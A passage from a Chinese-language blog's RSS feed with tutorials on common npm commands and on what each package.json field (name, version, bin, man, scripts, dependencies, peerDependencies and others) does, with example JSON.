</code></pre><div aria-hidden="true"><div></div><div></div><div></div></div></div><h2 id="npm-其他命令" tabindex="-1"> npm 其他命令</h2>
<h3 id="查看依赖包的所有的版本号" tabindex="-1"> 查看依赖包的所有的版本号</h3>
<div><pre><code>$ <span>npm</span> info <span>[</span>package-name<span>]</span> versions
</code></pre><div aria-hidden="true"><div></div></div></div><h3 id="创建-package-json-文件" tabindex="-1"> 创建 package.json 文件</h3>
<div><p>提示</p>
<p>安装包的信息可保持到项目的 <code>package.json</code> 文件中, 以便后续的其它的项目开发或者他人合作使用, 也说 <code>package.json</code> 在项目中是必不可少的。</p>
</div>
<div><pre><code>$ <span>npm</span> init
</code></pre><div aria-hidden="true"><div></div></div></div><h3 id="安装模块" tabindex="-1"> 安装模块</h3>
<div><p>提示</p>
<p>模块的依赖都被写入了 <code>package.json</code> 文件后, 他人打开项目的根目录（项目开源、内部团队合作）, 时, 只需一条命令就可以安装 <code>package.json</code> 中的依赖。</p>
</div>
<div><pre><code>$ <span>npm</span> <span>install</span>
</code></pre><div aria-hidden="true"><div></div></div></div><div><p>提示</p>
<p>加上 <code>--save</code> 会安装 <code>package.json</code> 中 <code>dependencies</code> 里的所有模块。 :::</p>
<div><pre><code>$ <span>npm</span> <span>install</span> --save
</code></pre><div aria-hidden="true"><div></div></div></div><h3 id="卸载模块" tabindex="-1"> 卸载模块</h3>
<p>想要卸载模块也很简单。</p>
<div><pre><code>$ <span>npm</span> uninstall <span>[</span>module-name<span>]</span>
</code></pre><div aria-hidden="true"><div></div></div></div><div><p>提示</p>
<p>以上写法并不会改变 <code>package.json</code> 文件, 使用 <code>-S | --save | -D | --save-dev | -O | --save-optional</code> 选项即可删除 <code>package.json</code> 文件中的依赖。<br> 如使用 <code>--save</code> 选项, 将会删除 <code>package.json</code> 文件 <code>dependencies</code> 中的该模块名和版本号。</p>
</div>
</div>
<div><pre><code>$ <span>npm</span> uninstall <span>[</span>module-name<span>]</span> --save
</code></pre><div aria-hidden="true"><div></div></div></div><h3 id="更新模块" tabindex="-1"> 更新模块</h3>
<div><p>提示</p>
<p>从服务器下载最新版本的模块。需要注意的是, 最新版本的模块并不是最稳定的, 模块还是选择相对稳定的版本较好。支持 <code>-g</code> 选项。</p>
</div>
<div><pre><code>$ <span>npm</span> update <span>[</span>-g<span>]</span> <span>[</span>module-name<span>]</span>
</code></pre><div aria-hidden="true"><div></div></div></div><h3 id="检查模块是否已经过时" tabindex="-1"> 检查模块是否已经过时</h3>
<div><p>提示</p>
<p>此命令会列出所有已经过时的包, 可以及时进行包的更新.</p>
</div>
<div><pre><code>$ <span>npm</span> outdated
</code></pre><div aria-hidden="true"><div></div></div></div><h3 id="启动模块" tabindex="-1"> 启动模块</h3>
<div><pre><code>$ <span>npm</span> start <span>[</span>-- <span>&lt;</span>args<span>></span><span>]</span>
</code></pre><div aria-hidden="true"><div></div></div></div><div><p>提示</p>
<p>该命令写在 <code>package.json</code> 文件 <code>scripts</code> 的 <code>start</code> 字段中, 可以自定义命令来配置一个服务器环境和安装一系列的必要程序, 如:</p>
</div>
<div><pre><code><span>"scripts"</span><span>:</span> <span>{</span>
  <span>"start"</span><span>:</span> <span>"gulp -s"</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div></div></div><div><p>提示</p>
<p>如果 <code>package.json</code> 文件没有设置 <code>start</code> , 则将直接启动 <code>node server.js</code></p>
</div>
<h3 id="停止模块" tabindex="-1"> 停止模块</h3>
<div><pre><code>$ <span>npm</span> stop <span>[</span>-- <span>&lt;</span>args<span>></span><span>]</span>
</code></pre><div aria-hidden="true"><div></div></div></div><h3 id="重新启动模块" tabindex="-1"> 重新启动模块</h3>
<div><pre><code>$ <span>npm</span> restart <span>[</span>-- <span>&lt;</span>args<span>></span><span>]</span>
</code></pre><div aria-hidden="true"><div></div></div></div><h3 id="更新模块-1" tabindex="-1"> 更新模块</h3>
<p>可以安装全局插件</p>
<div><pre><code>$ <span>npm</span> <span>install</span> -g npm-check-updates
</code></pre><div aria-hidden="true"><div></div></div></div><p>查看最新的版本</p>
<div><pre><code>$ npm-check-updates
$ ncu <span># 为上一条指令的缩写</span>
</code></pre><div aria-hidden="true"><div></div><div></div></div></div><p>升级至最新版本</p>
<div><pre><code>$ ncu -a
</code></pre><div aria-hidden="true"><div></div></div></div><p>在使用下载最新的安装包</p>
<div><pre><code>$ <span>npm</span> update
</code></pre><div aria-hidden="true"><div></div></div></div><p>当然, 如果所有包都是最新版本, 执行 ncu 后会提示:</p>
<div><pre><code>All dependencies match the latest package versions <span>:</span><span>)</span>
</code></pre><div aria-hidden="true"><div></div></div></div><h3 id="查看包的安装路径" tabindex="-1"> 查看包的安装路径</h3>
<div><p>提示</p>
<p>输出 node_modules 的路径, 支持 <code>-g</code> 选项。</p>
</div>
<div><pre><code>$ <span>npm</span> root <span>[</span>-g<span>]</span>
</code></pre><div aria-hidden="true"><div></div></div></div><h3 id="管理-npm-的配置路径" tabindex="-1"> 管理 npm 的配置路径</h3>
<div><p>提示</p>
<p>对于 config 这块用得最多应该是设置代理, 解决 npm 安装一些模块失败的问题</p>
</div>
<div><pre><code>$ <span>npm</span> config <span>set</span> <span>&lt;</span>key<span>></span> <span>&lt;</span>value<span>></span> <span>[</span>-g<span>|</span>--global<span>]</span>
$ <span>npm</span> config delete <span>&lt;</span>key<span>></span>
$ <span>npm</span> config list
</code></pre><div aria-hidden="true"><div></div><div></div><div></div></div></div><h3 id="查看命令的帮助" tabindex="-1"> 查看命令的帮助</h3>
<div><pre><code>$ <span>npm</span> <span>help</span> <span>&lt;</span>command<span>></span>
</code></pre><div aria-hidden="true"><div></div></div></div><h2 id="区别" tabindex="-1"> 区别</h2>
<ol>
<li><code>--save-dev</code> 是你开发时候依赖的东西； <code>--save</code> 是你发布之后还依赖的东西。</li>
<li><code>--save-optional</code> 是可选依赖, 非必下； <code>--save-exact</code> 可以指定精确的版本号, 也就是说当发布了新版本, 系统不会系在最新版本的模块, 只会下载该版本的模块。</li>
<li><code>npm install</code> 下载依赖时会安装 <code>package.json</code> 中 <code>dependencies</code> 和 <code>devDependencies</code> 里的所有模块。</li>
<li><code>npm install --save</code> 下载依赖时只会安装 <code>package.json</code> 中 <code>dependencies</code> 里的所有模块。</li>
<li>比如, 你写 <code>ES6</code> 代码, 如果你想编译成 <code>ES5</code> 发布那么 <code>babel</code> 就是 <code>devDependencies</code> 。</li>
<li>如果你用了 <code>jQuery</code> , 由于发布之后还是依赖 <code>jQuery</code> , 所以是 <code>dependencies</code> 。</li>
<li>最常用的还是 <code>npm</code> 中的 <code>--save</code> 和 <code>--save-dev</code> 选项。 <code>--save</code> 和 <code>--save-dev</code> 选项。</li>
</ol>
]]></content:encoded>
    </item>
    <item>
      <title>解读 npm 中的 package.json</title>
      <link>https://vxhly.github.io/views/nodejs/talk-package-json-on-npm.html</link>
      <guid>https://vxhly.github.io/views/nodejs/talk-package-json-on-npm.html</guid>
      <source url="https://vxhly.github.io/rss.xml">解读 npm 中的 package.json</source>
      <description>前言
package.json 是 Node.js 应用中比较重要的部分, 它定义了项目的依赖关系, 这里将介绍该文件各个配置项的作用。

</description>
      <category>nodejs</category>
      <pubDate>Tue, 30 Aug 2016 17:08:18 GMT</pubDate>
      <content:encoded><![CDATA[<div><p>前言</p>
<p>package.json 是 Node.js 应用中比较重要的部分, 它定义了项目的依赖关系, 这里将介绍该文件各个配置项的作用。</p>
</div>

<h2 id="创建-package-json-文件" tabindex="-1"> 创建 package.json 文件</h2>
<div><p>提示</p>
<p>安装包的信息可保持到项目的 <code>package.json</code> 文件中, 以便后续的其它的项目开发或者他人合作使用, 也说 <code>package.json</code> 在项目中是必不可少的。</p>
</div>
<div><pre><code><span>npm</span> init
</code></pre><div aria-hidden="true"><div></div></div></div><h2 id="package-json-文件解读" tabindex="-1"> package.json 文件解读</h2>
<h3 id="默认值" tabindex="-1"> 默认值</h3>
<p><code>npm</code> 会根据包内容设置一些默认值。</p>
<ul>
<li>
<p><code>&quot;scripts&quot;: {&quot;start&quot;: &quot;node server.js&quot;}</code> -- 如果包的根目录有 <code>server.js</code> 文件, <code>npm</code> 会默认将 <code>start</code> 命令设置为 <code>node server.js</code> 。</p>
</li>
<li>
<p><code>&quot;scripts&quot;:{&quot;preinstall&quot;: &quot;node-waf clean || true;node-waf configure build&quot;}</code> -- 如果包的根目录有 <code>wscript</code> 文件, <code>npm</code> 会默认将 <code>preinstall</code> 命令用 <code>node-waf</code> 进行编译。</p>
</li>
<li>
<p><code>&quot;scripts&quot;:{&quot;preinstall&quot;: &quot;node-gyp rebuild&quot;}</code> -- 如果包的根目录有 <code>binding.gyp</code> 文件, <code>npm</code> 会默认将 <code>preinstall</code> 命令用 <code>node-gyp</code> 进行编译。</p>
</li>
<li>
<p><code>&quot;contributors&quot;: [...]</code> -- 如果包的根目录有 <code>AUTHORS</code> 文件, <code>npm</code> 会默认逐行按 <code>Name &lt;email(url)</code> 格式处理, 邮箱和 <code>url</code> 是可选的。 <code>#号</code> 和 <code>空格</code> 开头的行会被忽略。</p>
</li>
</ul>
<h3 id="name" tabindex="-1"> name</h3>
<div><p>作用</p>
<p>在 <code>package.json</code> 中最重要的就是 <code>name</code> 和 <code>version</code> 字段。他们都是必须的, 如果没有就无法 <code>install</code> 。 <code>name</code> 和 <code>version</code> 一起组成的标识在假设中是唯一的。改变包应该同时改变 <code>version</code> 。<br> name 是这个东西的名字。注意:</p>
</div>
<ul>
<li>不要把 <code>node</code> 或者 <code>js</code> 放在名字中。因为你写了 <code>package.json</code> 它就被假定成为了 <code>js</code> , 不过你可以用 <code>&quot;engine&quot;字段</code> 指定一个引擎（见后文）。</li>
<li>这个名字会作为在 <code>URL</code> 的一部分、命令行的参数或者文件夹的名字。任何 <code>non-url-safe</code> 的字符都是不能用的。</li>
<li>这个名字可能会作为参数被传入 <code>require()</code> , 所以它应该比较短, 但也要意义清晰。</li>
<li>在你爱上你的名字之前, 你可能要去 <code>npm registry</code> 查看一下这个名字是否已经被使用了。<a href="http://registry.npmjs.org/" target="_blank" rel="noopener noreferrer">http://registry.npmjs.org/</a></li>
</ul>
<h3 id="version" tabindex="-1"> version</h3>
<div><p>作用</p>
<p>在 <code>package.json</code> 中最重要的就是 <code>name</code> 和 <code>version</code> 字段。他们都是必须的, 如果没有就无法 <code>install</code> 。 <code>name</code> 和 <code>version</code> 一起组成的标识在假设中是唯一的。改变包应该同时改变 <code>version</code> 。<br> <code>version</code> 必须能被 <code>node-semver</code> 解析, 它被包在 <code>npm</code> 的依赖中。（要自己用可以执行 <code>npm install semver</code> ）</p>
</div>
<p>可用的&quot;数字&quot;或者&quot;范围&quot;见 <a href="http://npmjs.org/doc/misc/semver.html" target="_blank" rel="noopener noreferrer">semver</a>。</p>
<h3 id="description" tabindex="-1"> description</h3>
<p>放简介, 字符串。方便屌丝们在 <code>npm search</code> 中搜索。</p>
<h3 id="keywords" tabindex="-1"> keywords</h3>
<p>关键字, 数组、字符串。还是方便屌丝们在 <code>npm search</code> 中搜索。</p>
<h3 id="homepage" tabindex="-1"> homepage</h3>
<p>项目官网的 <code>url</code> 。</p>
<p>注意: 这和 <code>“url”</code> 不一样。如果你放一个 <code>“url”</code> 字段, <code>registry</code> 会以为是一个跳转到你发布在其他地方的地址, 然后喊你滚粗。</p>
<p>嗯, 滚粗, 没开玩笑。</p>
<h3 id="bugs" tabindex="-1"> bugs</h3>
<p>你项目的提交问题的 <code>url</code> 和（或） <code>邮件地址</code> 。这对遇到问题的屌丝很有帮助。 差不多长这样:</p>
<div><pre><code><span>{</span>
  <span>"url"</span><span>:</span> <span>"https://github.com/owner/project/issues"</span><span>,</span>
  <span>"email"</span><span>:</span> <span>"project@hostname.com"</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div></div></div><p>你可以指定一个或者指定两个。如果你只想提供一个 <code>url</code> , 那就不用对象了, 字符串就行。 如果提供了 <code>url</code> , 它会被 <code>npm bugs</code> 命令使用。</p>
<h3 id="license" tabindex="-1"> license</h3>
<div><p>作用</p>
<p>你应该要指定一个许可证, 让人知道使用的权利和限制的。<br> 最简单的方法是, 假如你用一个像 <code>BSD</code> 或者 <code>MIT</code> 这样通用的许可证, 就只需要指定一个许可证的名字, 像这样:</p>
</div>
<div><pre><code><span>{</span>
  <span>"license"</span><span>:</span> <span>"BSD"</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div></div></div><p>如果你又更复杂的许可条件, 或者想要提供给更多地细节, 可以这样:</p>
<div><pre><code><span>"licenses"</span> <span>:</span> <span>[</span>
  <span>{</span>
    <span>"type"</span> <span>:</span> <span>"MyLicense"</span> <span>,</span>
    <span>"url"</span> <span>:</span> <span>"&lt;https://github.com/owner/project/path/to/license>"</span>
  <span>}</span>
<span>]</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p>在根目录中提供一个许可证文件也蛮好的。</p>
<h3 id="people-fields-author-contributors" tabindex="-1"> people fields: author, contributors</h3>
<p><code>author</code> 是一个人。 <code>contributors</code> 是一堆人的数组。 <code>person</code> 是一个有 <code>name</code> 字段, 可选的有 <code>url</code> 、 <code>email</code> 字段的对象, 像这样:</p>
<div><pre><code><span>{</span>
  <span>"name"</span><span>:</span> <span>"Barney Rubble"</span><span>,</span>
  <span>"email"</span><span>:</span> <span>"b@rubble.com"</span><span>,</span>
  <span>"url"</span><span>:</span> <span>"https://barnyrubble.tumblr.com/"</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div></div></div><p>或者可以把所有的东西都放到一个字符串里, <code>npm </code> `会给你解析:</p>
<div><pre><code><span>{</span>
  <span>"Barney Rubble &lt;b@rubble.com> (https://barnyrubble.tumblr.com/)"</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div></div></div><p><code>email</code> 和 <code>url</code> 在两种形式中都是可选的。</p>
<p>也可以在你的 <code>npm</code> 用户信息中设置一个顶级的 <code>maintainers</code> 字段。</p>
<h3 id="files" tabindex="-1"> files</h3>
<p><code>files</code> 是一个包含项目中的文件的数组。如果命名了一个文件夹, 那也会包含文件夹中的文件。（除非被其他条件忽略了）</p>
<p>你也可以提供一个 <code>.npmignore</code> 文件, 让即使被包含在 <code>files</code> 字段中得文件被留下。其实就像 <code>.gitignore</code> 一样。</p>
<h3 id="main" tabindex="-1"> main</h3>
<p><code>main</code> 字段配置一个文件名指向模块的入口程序。如果你包的名字叫 <code>foo</code> , 然后用户 <code>require(&quot;foo&quot;)</code> , <code>main</code> 配置的模块的 <code>exports</code> 对象会被返回。</p>
<p>这应该是一个相对于根目录的文件路径。</p>
<p>对于大多数模块, 它是非常有意义的, 其他的都没啥。</p>
<h3 id="bin" tabindex="-1"> bin</h3>
<p>很多包都有一个或多个可执行的文件希望被放到 <code>PATH</code> 中。 <code>npm</code> 让妈妈再也不用担心了（实际上, 就是这个功能让 <code>npm</code> 可执行的）。</p>
<p>要用这个功能, 给 <code>package.json</code> 中的 <code>bin</code> 字段一个命令名到文件位置的 <code>map</code> 。初始化的时候 <code>npm</code> 会将他链接到 <code>prefix/bin（全局初始化）</code> 或者 <code>./node_modules/.bin/（本地初始化）</code> 。</p>
<p>比如, <code>npm</code> 有:</p>
<div><pre><code><span>{</span>
  <span>"bin"</span><span>:</span> <span>{</span>
    <span>"npm"</span><span>:</span> <span>"./cli.js"</span>
  <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div></div></div><p>所以, 当你初始化 <code>npm</code> , 它会创建一个符号链接到 <code>cli.js</code> 脚本到 <code>/usr/local/bin/npm</code> 。</p>
<p>如果你只有一个可执行文件, 并且名字和包名一样。那么你可以只用一个字符串, 比如:</p>
<div><pre><code><span>{</span>
  <span>"name"</span><span>:</span> <span>"my-program"</span><span>,</span>
  <span>"version"</span><span>:</span> <span>"1.2.5"</span><span>,</span>
  <span>"bin"</span><span>:</span> <span>"./path/to/program"</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div></div></div><p>结果和这个一样:</p>
<div><pre><code><span>{</span>
  <span>"name"</span><span>:</span> <span>"my-program"</span><span>,</span>
  <span>"version"</span><span>:</span> <span>"1.2.5"</span><span>,</span>
  <span>"bin"</span><span>:</span> <span>{</span>
    <span>"my-program"</span><span>:</span> <span>"./path/to/program"</span>
  <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id="man" tabindex="-1"> man</h3>
<p>指定一个单一的文件或者一个文件数组供 <code>man</code> 程序使用。如果只提供一个单一的文件, 那么它初始化后就是 <code>man &lt;pkgname&gt;</code> 的结果, 而不管实际的文件名是神马, 比如:</p>
<div><pre><code><span>{</span>
  <span>"name"</span><span>:</span> <span>"foo"</span><span>,</span>
  <span>"version"</span><span>:</span> <span>"1.2.3"</span><span>,</span>
  <span>"description"</span><span>:</span> <span>"A packaged foo fooer for fooing foos"</span><span>,</span>
  <span>"main"</span><span>:</span> <span>"foo.js"</span><span>,</span>
  <span>"man"</span><span>:</span> <span>"./man/doc.1"</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p>这样 <code>man foo</code> 就可以用到 <code>./man/doc.1</code> 文件了。</p>
<p>如果文件名不是以包名开头, 那么它会被冠以前缀, 下面的:</p>
<div><pre><code><span>{</span>
  <span>"name"</span><span>:</span> <span>"foo"</span><span>,</span>
  <span>"version"</span><span>:</span> <span>"1.2.3"</span><span>,</span>
  <span>"description"</span><span>:</span> <span>"A packaged foo fooer for fooing foos"</span><span>,</span>
  <span>"main"</span><span>:</span> <span>"foo.js"</span><span>,</span>
  <span>"man"</span><span>:</span> <span>[</span><span>"./man/foo.1"</span><span>,</span> <span>"./man/bar.1"</span><span>]</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p>会为 <code>man foo</code> 和 <code>man foo-bar</code> 创建文件。</p>
<p><code>man</code> 文件需要以数字结束, 然后可选地压缩后以 <code>.gz</code> 为后缀。</p>
<div><pre><code><span>{</span>
  <span>"name"</span><span>:</span> <span>"foo"</span><span>,</span>
  <span>"version"</span><span>:</span> <span>"1.2.3"</span><span>,</span>
  <span>"description"</span><span>:</span> <span>"A packaged foo fooer for fooing foos"</span><span>,</span>
  <span>"main"</span><span>:</span> <span>"foo.js"</span><span>,</span>
  <span>"man"</span><span>:</span> <span>[</span><span>"./man/foo.1"</span><span>,</span> <span>"./man/foo.2"</span><span>]</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p>会为 <code>man foo</code> 和 <code>man 2 foo</code> 创建。</p>
<h3 id="directories" tabindex="-1"> directories</h3>
<p><code>CommonJS Packages</code> 规范说明了几种方式让你可以用 <code>directorieshash</code> 标示出包得结构。如果看一下 <code>npm's package.json</code> , 你会看到有 <code>directories</code> 标示出 doc, lib, and man。</p>
<p>在未来, 这个信息可能会被用到。</p>
<h3 id="directories-lib" tabindex="-1"> directories.lib</h3>
<p>告诉屌丝们你的库文件夹在哪里。目前没有什么特别的东西需要用到 <code>lib</code> 文件夹, 但确实是重要的元信息。</p>
<h3 id="directories-bin" tabindex="-1"> directories.bin</h3>
<p>如果你指定一个 <code>&quot;bin&quot;</code> 目录, 然后在那个文件夹中得所有文件都会被当做 <code>&quot;bin&quot;</code> 字段使用。<br> 如果你已经指定了 <code>&quot;bin&quot;</code> 字段, 那这个就无效。</p>
<h3 id="directories-man" tabindex="-1"> directories.man</h3>
<p>一个放满 <code>man</code> 页面的文件夹。贴心地创建一个 <code>&quot;man&quot;</code> 字段。</p>
<h3 id="directories-doc" tabindex="-1"> directories.doc</h3>
<p>将 <code>markdown</code> 文件放在这里。最后, 这些会被很好地展示出来,</p>
<h3 id="directories-example" tabindex="-1"> directories.example</h3>
<p>将事例脚本放在这里。某一天, 它可能会以聪明的方式展示出来。</p>
<h3 id="repository" tabindex="-1"> repository</h3>
<div><p>作用</p>
<p>指定你的代码存放的地方。这个对希望贡献的人有帮助。如果 git 仓库在 github 上, 那么 npm docs 命令能找到你。</p>
</div>
<p>这样做:</p>
<div><pre><code><span>"repository"</span> <span>:</span> <span>{</span>
  <span>"type"</span> <span>:</span> <span>"git"</span> <span>,</span>
  <span>"url"</span> <span>:</span> <span>"&lt;https://github.com/isaacs/npm.git>"</span>
<span>}</span>

<span>"repository"</span> <span>:</span> <span>{</span>
  <span>"type"</span> <span>:</span> <span>"svn"</span> <span>,</span>
  <span>"url"</span> <span>:</span> <span>"&lt;http://v8.googlecode.com/svn/trunk/>"</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p><code>URL</code> 应该是公开的（即便是只读的）能直接被未经过修改的版本控制程序处理的 <code>url</code> 。不应该是一个 html 的项目页面。因为它是给计算机看的。</p>
<h3 id="scripts" tabindex="-1"> scripts</h3>
<p><code>&quot;scripts&quot;</code> 是一个由脚本命令组成的 <code>hash</code> 对象, 他们在包不同的生命周期中被执行。 <code>key</code> 是生命周期事件, <code>value</code> 是要运行的命令。<br> 参见 <a href="http://npmjs.org/doc/misc/npm-scripts.html" target="_blank" rel="noopener noreferrer">npm-scripts</a></p>
<h3 id="config" tabindex="-1"> config</h3>
<p><code>&quot;config&quot; hash</code> 可以用来配置用于包脚本中的跨版本参数。在实例中, 如果一个包有下面的配置:</p>
<div><pre><code><span>{</span>
  <span>"name"</span><span>:</span> <span>"foo"</span><span>,</span>
  <span>"config"</span><span>:</span> <span>{</span>
    <span>"port"</span><span>:</span> <span>"8080"</span>
  <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p>然后有一个 <code>“start”</code> 命令引用了 <code>npm_package_config_port</code> 环境变量, 用户可以通过 <code>npm config set foo:port 8001</code> 来重写他。</p>
<p>参见 <a href="http://npmjs.org/doc/misc/npm-config.html" target="_blank" rel="noopener noreferrer">npm-config</a> 和 <a href="http://npmjs.org/doc/misc/npm-scripts.html" target="_blank" rel="noopener noreferrer">npm-scripts</a>。</p>
<h3 id="dependencies" tabindex="-1"> dependencies</h3>
<div><p>作用</p>
<p>依赖是给一组包名指定版本范围的一个 <code>hash</code> 。这个版本范围是一个由一个或多个空格分隔的字符串。依赖还可以用 <code>tarball</code> 或者 <code>git URL</code> 。<br> 请不要将测试或过渡性的依赖放在 <code>dependencieshash</code> 中。见下文的 <code>devDependencies</code> 。<br> 详见 <a href="http://npmjs.org/doc/misc/semver.html" target="_blank" rel="noopener noreferrer">semver</a></p>
</div>
<ul>
<li><code>version</code> 必须完全和 <code>version</code> 一致</li>
<li><code>&gt;version</code> 必须比 <code>version</code> 大</li>
<li><code>&gt;=version</code> 同上</li>
<li><code>&lt;version</code> 同上</li>
<li><code>&lt;=version</code> 同上</li>
<li><code>~version</code> 大约一样, 见 <a href="http://npmjs.org/doc/misc/semver.html" target="_blank" rel="noopener noreferrer">semver</a></li>
<li><code>1.2.x</code> , <code>1.2.0</code> , <code>1.2.1</code> , 等, 但不包括 <code>1.3.0</code></li>
<li><code>//...</code> 见下文 <code>'依赖 URL'</code></li>
<li><code>*</code> 所有</li>
<li><code>&quot;&quot;</code> 空, 同 <code>*</code></li>
<li><code>version1 - version2</code> 同 <code>&gt;=version1 &lt;=version2</code></li>
<li><code>range1 || range2</code> 二选一。</li>
<li><code>git...</code> 见下文 <code>'依赖Git URL'</code></li>
<li><code>user/repo</code> 见下文 <code>'GitHub URLs'</code> 比如下面都是合法的:</li>
</ul>
<div><pre><code><span>{</span>
  <span>"dependencies"</span><span>:</span> <span>{</span>
    <span>"foo"</span><span>:</span> <span>"1.0.0 - 2.9999.9999"</span><span>,</span>
    <span>"bar"</span><span>:</span> <span>">=1.0.2 &lt;2.1.2"</span><span>,</span>
    <span>"baz"</span><span>:</span> <span>">1.0.2 &lt;=2.3.4"</span><span>,</span>
    <span>"boo"</span><span>:</span> <span>"2.0.1"</span><span>,</span>
    <span>"qux"</span><span>:</span> <span>"&lt;1.0.0 || >=2.3.1 &lt;2.4.5 || >=2.5.2 &lt;3.0.0"</span><span>,</span>
    <span>"asd"</span><span>:</span> <span>"https://asdf.com/asdf.tar.gz"</span><span>,</span>
    <span>"til"</span><span>:</span> <span>"~1.2"</span><span>,</span>
    <span>"elf"</span><span>:</span> <span>"~1.2.3"</span><span>,</span>
    <span>"two"</span><span>:</span> <span>"2.x"</span><span>,</span>
    <span>"thr"</span><span>:</span> <span>"3.3.x"</span>
  <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id="依赖-url" tabindex="-1"> 依赖 URL</h3>
<div><p>提示</p>
<p>可以指定一个 <code>tarball URL</code> , 这个 <code>tarball</code> 将在包被初始化的时候下载并初始化。</p>
</div>
<h3 id="依赖-git-url" tabindex="-1"> 依赖 Git URL</h3>
<p><code>Git urls</code> 可以是下面几种形式:</p>
<ul>
<li>git: <a href="https://github.com/user/project.git#commit-ish" target="_blank" rel="noopener noreferrer">https://github.com/user/project.git#commit-ish</a></li>
<li>git+ssh: <a href="https://user@hostname:project.git#commit-ish" target="_blank" rel="noopener noreferrer">https://user@hostname:project.git#commit-ish</a></li>
<li>git+ssh: <a href="https://user@hostname/project.git#commit-ish" target="_blank" rel="noopener noreferrer">https://user@hostname/project.git#commit-ish</a></li>
<li>git+<a href="https://user@hostname/project/blah.git#commit-ish" target="_blank" rel="noopener noreferrer">https://user@hostname/project/blah.git#commit-ish</a></li>
<li>git+<a href="https://user@hostname/project/blah.git#commit-ish" target="_blank" rel="noopener noreferrer">https://user@hostname/project/blah.git#commit-ish</a></li>
</ul>
<p><code>commit-ish</code> 是可以被 <code>git checkout</code> 的任何 <code>tag、sha</code> 或者 <code>branch</code> 。默认为 <code>master</code> 。</p>
<h3 id="github-urls" tabindex="-1"> GitHub URLs</h3>
<p><code>1.1.65</code> 版后, 你可以仅仅用 <code>“user/foo-project”</code> 引用 <code>GitHub urls</code> , 比如:</p>
<div><pre><code><span>{</span>
  <span>"name"</span><span>:</span> <span>"foo"</span><span>,</span>
  <span>"version"</span><span>:</span> <span>"0.0.0"</span><span>,</span>
  <span>"dependencies"</span><span>:</span> <span>{</span>
    <span>"express"</span><span>:</span> <span>"visionmedia/express"</span>
  <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id="devdependencies" tabindex="-1"> devDependencies</h3>
<div><p>作用</p>
<p>如果有人要使用你的模块, 那么他们可能不需要你开发使用的外部测试或者文档框架。<br> 在这种情况下, 最好将这些附属的项目列在 <code>devDependencies</code> 中。</p>
</div>
<p>这些东西会在执行 <code>npm link</code> 或者 <code>npm install</code> 的时候初始化, 并可以像其他 <code>npm</code> 配置参数一样管理。详见 <a href="http://npmjs.org/doc/misc/npm-config.html" target="_blank" rel="noopener noreferrer">npm-config</a>。</p>
<p>对于非特定平台的构建步骤, 比如需要编译 <code>CoffeeScript</code> , 可以用 <code>prepublish</code> 脚本去实现, 并把它依赖的包放在 <code>devDependency</code> 中。（注: <code>prepublish</code> 定义了在执行 <code>npm publish</code> 的时候先行执行的脚本）</p>
<p>比如:</p>
<div><pre><code><span>{</span>
  <span>"name"</span><span>:</span> <span>"ethopia-waza"</span><span>,</span>
  <span>"description"</span><span>:</span> <span>"a delightfully fruity coffee varietal"</span><span>,</span>
  <span>"version"</span><span>:</span> <span>"1.2.3"</span><span>,</span>
  <span>"devDependencies"</span><span>:</span> <span>{</span>
    <span>"coffee-script"</span><span>:</span> <span>"~1.6.3"</span>
  <span>}</span><span>,</span>
  <span>"scripts"</span><span>:</span> <span>{</span>
    <span>"prepublish"</span><span>:</span> <span>"coffee -o lib/ -c src/waza.coffee"</span>
  <span>}</span><span>,</span>
  <span>"main"</span><span>:</span> <span>"lib/waza.js"</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p><code>prepublish</code> 脚本会在 <code>publishing</code> 前运行, 这样用户就不用自己去 <code>require</code> 来编译就能使用。并且在开发模式中（比如本地运行 <code>npm install</code> ）会运行这个脚本以便更好地测试。</p>
<h3 id="peerdependencies" tabindex="-1"> peerDependencies</h3>
<div><p>作用</p>
<p>在一些场景中, 如在一个 <code>host</code> 中不必须进行 <code>require</code> 时候, 你想表现你的 <code>package</code> 与一个 <code>host</code> 工具或者库的兼容关键。这一般用来引用插件。尤其是你的模块可能要暴露一个特定的接口, 并由 <code>host</code> 文档来预期和指定。</p>
</div>
<p>比如:</p>
<div><pre><code><span>{</span>
  <span>"name"</span><span>:</span> <span>"tea-latte"</span><span>,</span>
  <span>"version"</span><span>:</span> <span>"1.3.5"</span><span>,</span>
  <span>"peerDependencies"</span><span>:</span> <span>{</span>
    <span>"tea"</span><span>:</span> <span>"2.x"</span>
  <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p>这能保证你的 <code>package</code> 可以只和 <code>tea</code> 的 <code>2.x 版本</code> 一起初始化。</p>
<p>试图初始化另一个有会冲突的依赖的插件将导致一个错误。因此, 确保你的插件的需求约束越弱越好, 而不要去把它锁定到一个特定的版本。</p>
